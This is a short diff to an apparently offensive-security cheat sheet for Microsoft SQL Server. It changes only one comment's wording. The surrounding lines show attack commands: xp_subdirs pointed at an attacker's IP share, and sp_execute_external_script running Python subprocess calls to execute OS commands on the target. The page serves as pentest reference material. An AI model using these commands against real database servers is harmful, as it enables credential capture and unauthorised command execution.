@@ -349,7 +349,7 @@ EXEC master..xp_subdirs <span class="s1">'\\&lt;our IP address&gt;\share\'</span
 
 <div class="highlight"><pre class="highlight shell"><code><span class="c"># If this right is enabled with our user, we might be able</span>
 <span class="c"># to use Python or R against the target. For Python, test</span>
-<span class="c"># with the following:</span>
+<span class="c"># with the following command:</span>
 EXEC sp_execute_external_script @language <span class="o">=</span> N<span class="s1">'Python'</span> , @script <span class="o">=</span> N<span class="s1">'import subprocess;a = subprocess.check_output(["whoami"], shell=True).decode();print(a);'</span>
 
 <span class="c"># If 'whoami' works, we can process commands by changing</span>
